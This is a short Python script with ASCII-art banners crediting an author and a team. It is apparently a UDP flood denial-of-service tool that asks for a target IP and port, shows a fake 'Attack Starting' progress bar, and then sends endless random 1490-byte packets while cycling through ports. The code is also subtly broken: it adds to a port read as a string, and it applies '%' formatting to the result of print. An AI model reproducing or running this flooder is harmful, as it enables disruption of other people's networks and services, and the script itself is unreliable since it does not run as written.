print('''  sSSs   .S S.    .S_sSSs     .S    S.     sSSs   .S_sSSs    
 d%%SP  .SS SS.  .SS~YS%%b   .SS    SS.   d%%SP  .SS~YS%%b   
d%S'    S%S S%S  S%S   `S%b  S%S    S&S  d%S'    S%S   `S%b  
S%|     S%S S%S  S%S    S%S  S%S    d*S  S%S     S%S    S%S  
S&S     S%S S%S  S%S    S&S  S&S   .S*S  S&S     S%S    d*S  
Y&Ss     SS SS   S&S    S&S  S&S_sdSSS   S&S_Ss  S&S   .S*S  
`S&&S     S S    S&S    S&S  S&S~YSSY%b  S&S~SP  S&S_sdSSS   
  `S*S    SSS    S&S    S&S  S&S    `S%  S&S     S&S~YSY%b   
   l*S    S*S    S*S    S*S  S*S     S%  S*b     S*S   `S%b  
  .S*P    S*S    S*S    S*S  S*S     S&  S*S.    S*S    S%S  
sSS*S     S*S    S*S    S*S  S*S     S&   SSSbs  S*S    S&S  
YSS'      S*S    S*S    SSS  S*S     SS    YSSP  S*S    SSS  
          SP     SP          SP                  SP          
          Y      Y           Y                   Y           ''')
print(''' ________      ___    ___                  _____ ______   ________  ___  ___  ________  _____ ______   _____ ______   _______   ________     
|\   __  \    |\  \  /  /|     ___        |\   _ \  _   \|\   __  \|\  \|\  \|\   __  \|\   _ \  _   \|\   _ \  _   \|\  ___ \ |\   ___ \    
\ \  \|\ /_   \ \  \/  / /    |\__\       \ \  \\\__\ \  \ \  \|\  \ \  \\\  \ \  \|\  \ \  \\\__\ \  \ \  \\\__\ \  \ \   __/|\ \  \_|\ \   
 \ \   __  \   \ \    / /     \|__|        \ \  \\|__| \  \ \  \\\  \ \   __  \ \   __  \ \  \\|__| \  \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \  
  \ \  \|\  \   \/  /  /          ___       \ \  \    \ \  \ \  \\\  \ \  \ \  \ \  \ \  \ \  \    \ \  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ 
   \ \_______\__/  / /           |\__\       \ \__\    \ \__\ \_______\ \__\ \__\ \__\ \__\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\
    \|_______|\___/ /            \|__|        \|__|     \|__|\|_______|\|__|\|__|\|__|\|__|\|__|     \|__|\|__|     \|__|\|_______|\|_______|
             \|___|/                                                                                                                         

                                                                                                                                             ''')
print('''  █████                                                ██████   ██████  ███                           █████                █████                                   
 ░░███                                                ░░██████ ██████  ░░░                           ░░███                ░░███                                    
 ███████    ██████   ██████   █████████████      ██    ░███░█████░███  ████  █████ ███ █████  ██████  ░███ █████  ██████   ░███ █████ █████ ████  █████  █████ ████
░░░███░    ███░░███ ░░░░░███ ░░███░░███░░███    ░░     ░███░░███ ░███ ░░███ ░░███ ░███░░███  ███░░███ ░███░░███  ░░░░░███  ░███░░███ ░░███ ░███  ███░░  ░░███ ░███ 
  ░███    ░███████   ███████  ░███ ░███ ░███           ░███ ░░░  ░███  ░███  ░███ ░███ ░███ ░███ ░███ ░██████░    ███████  ░██████░   ░███ ░███ ░░█████  ░███ ░███ 
  ░███ ███░███░░░   ███░░███  ░███ ░███ ░███           ░███      ░███  ░███  ░░███████████  ░███ ░███ ░███░░███  ███░░███  ░███░░███  ░███ ░███  ░░░░███ ░███ ░███ 
  ░░█████ ░░██████ ░░████████ █████░███ █████    ██    █████     █████ █████  ░░████░████   ░░██████  ████ █████░░████████ ████ █████ ░░████████ ██████  ░░████████
   ░░░░░   ░░░░░░   ░░░░░░░░ ░░░░░ ░░░ ░░░░░    ░░    ░░░░░     ░░░░░ ░░░░░    ░░░░ ░░░░     ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░ ░░░░ ░░░░░   ░░░░░░░░ ░░░░░░    ░░░░░░░░ 
                                                                                                                                                                   ''')
import sys

import os

import time

import socket

import random

from datetime import datetime

now = datetime.now()

hour = now.hour

minute = now.minute

day = now.day

month = now.month

year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

ip = input("IP Target : ")

port = input("Port       : ")

os.system("clear")

os.system("figlet Attack Starting")

print("[                    ] 0% ")

time.sleep(5)

print("[=====               ] 25%")

time.sleep(5)

print("[==========          ] 50%")

time.sleep(5)

print("[===============     ] 75%")

time.sleep(5)

print("[====================] 100%")

time.sleep(3)

sent = 0

while True:

    sock.sendto(bytes, (ip, port))

    sent = sent + 1

    port = port + 1

    print("Sent %s packet to %s throught port:%s") % (sent, ip, port)

    if port == 65534:
        port = 1

